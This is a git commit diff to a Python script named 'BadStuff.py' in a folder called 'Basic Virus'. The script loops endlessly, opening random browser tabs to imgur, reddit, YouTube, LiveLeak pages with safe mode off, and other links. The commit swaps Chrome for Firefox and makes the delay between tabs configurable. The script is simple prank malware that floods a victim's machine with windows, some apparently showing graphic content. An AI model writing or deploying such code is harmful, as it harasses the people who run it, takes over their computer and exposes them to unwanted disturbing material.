33fc0911974a9bf6e86fb80885c1347442413389
Jordan Camilletti <jordan.camilletti@gmail.com>
2017-07-07 18:43:25 -0500

    Update BadStuff.py

--- Basic Virus/BadStuff.py
+++ Basic Virus/BadStuff.py
@@ -10,22 +10,23 @@ redditUrls=["84yqig40xm7z.png"]
 youtubeUrls=["watch?v=19eFnrSf41A&feature=youtu.be&t=5m39s"]
 liveleakUrls=["view?i=461_1360105026&safe_mode=off","view?i=bb4_1283184704&safe_mode=off","view?i=5e8_1425739036&safe_mode=off"]
 otherUrls=["http://33.media.tumblr.com/5743e899731d3604cfbc1871ef64f9dc/tumblr_njk3p6hCUh1unvl7to1_500.gif","https://streamable.com/o3mic"]
-def start():
+browsers=['firefox','chrome']
+def start(slep):
 	while(True):
 		page=randint(0,4)
 		if(page==0):#https://i.imgur.com/
 			link=imgurUrls[randint(0,len(imgurUrls)-1)]
-			webbrowser.get('chrome').open("https://i.imgur.com/"+link)
+			webbrowser.get('firefox').open("https://i.imgur.com/"+link)
 		elif(page==1):#https://i.redd.it/
 			link=redditUrls[randint(0,len(redditUrls)-1)]
-			webbrowser.get('chrome').open("https://i.redd.it/"+link)
+			webbrowser.get('firefox').open("https://i.redd.it/"+link)
 		elif(page==2):#https://www.youtube.com/
 			link=youtubeUrls[randint(0,len(youtubeUrls)-1)]
-			webbrowser.get('chrome').open("https://www.youtube.com/"+link)
+			webbrowser.get('firefox').open("https://www.youtube.com/"+link)
 		elif(page==3):#https://www.liveleak.com/
 			link=liveleakUrls[randint(0,len(liveleakUrls)-1)]
-			webbrowser.get('chrome').open("https://www.liveleak.com/"+link)
+			webbrowser.get('firefox').open("https://www.liveleak.com/"+link)
 		elif(page==4):#other, no link header
 			link=otherUrls[randint(0,len(otherUrls)-1)]
-			webbrowser.get('chrome').open(link)
-		time.sleep(1)
+			webbrowser.get('firefox').open(link)
+		time.sleep(slep)
